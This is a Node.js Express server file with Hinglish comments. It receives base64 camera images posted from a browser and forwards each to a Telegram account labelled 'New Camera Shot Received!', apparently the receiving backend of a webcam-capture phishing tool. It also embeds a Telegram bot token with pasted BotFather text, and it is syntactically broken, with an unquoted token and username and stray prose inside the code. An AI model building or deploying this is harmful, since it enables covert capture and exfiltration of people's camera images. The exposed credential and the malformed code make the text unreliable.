const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

//Momos_877291_Bot

Use this token to access the HTTP API:
8547611250:AAF3ZOp1GGaXyzfakdT5Mb2Wlvr9dVv4g9c
Keep your token secure and store it safely, it can be used by anyone to control your bot.

For a description of the Bot API, see this page: https://core.telegram.org/bots/api
const TOKEN = 8547611250:AAF3ZOp1GGaXyzfakdT5Mb2Wlvr9dVv4g9c
// FollowVenusAndSaturn
const MY_USERNAME = FollowVenusAndSaturn

const bot = new TelegramBot(TOKEN, {polling: true});

const app = express();
app.use(express.json());

// Ye endpoint browser se image receive karega
app.post('/receive-image', async (req, res) => {
    try {
        const imageData = req.body.imageData; // Base64 format mein image
        
        // Base64 ko Buffer mein convert karein
        const base64Data = imageData.replace(/^data:image\/jpeg;base64,/u, "");
        const buffer = Buffer.from(base64Data, 'base64');

        // Temporary file banayein
        const filename = `photo_${Date.now()}.jpg`;
        fs.writeFileSync(filename, buffer);

        // Telegram Bot ko bhejein
        await bot.sendPhoto(MY_USERNAME, {
            source: fs.createReadStream(filename),
            caption: "📸 New Camera Shot Received!"
        });

        // Temporary file delete karein (storage bachane ke liye)
        fs.unlinkSync(filename);

        res.json({ success: true, message: "Image sent to Telegram" });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Server start karein
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});